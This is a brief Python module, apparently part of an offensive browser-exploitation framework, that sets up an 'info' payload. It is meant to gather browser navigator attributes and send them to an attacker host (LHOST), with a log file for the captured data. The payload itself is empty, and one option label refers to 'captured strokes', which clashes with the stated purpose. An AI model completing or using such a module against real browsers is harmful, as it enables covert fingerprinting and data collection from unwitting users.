#!/usr/bin/python3.7
import socket
def local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        return s.getsockname()[0]
    except:
        return "N/A"
name="info"
description="Retrieve information about the application that launched the script"
options = [["LHOST", "Host to send captured strokes to", local_ip()]] 
handler_options = [["LOGFILE", "File to store logged data", "storage_dump.txt"]]

navigator_attributes = [
    "navigator.appCodeName",
    "navigator.appName",
    "navigator.appVersion",
    "navigator.buildID",
    "navigator.cookieEnabled",
    "navigator.language",
    "navigator.mimeTypes",
    "navigator.onLine",
    "navigator.oscpu",
    "navigator.platform",
    "navigator.plugins",
    "navigator.product",
    "navigator.productSub",
    "navigator.securityPolicy",
    "navigator.userAgent",
    "navigator.vendor",
    "navigator.vendorSub",
]

payload = """


"""
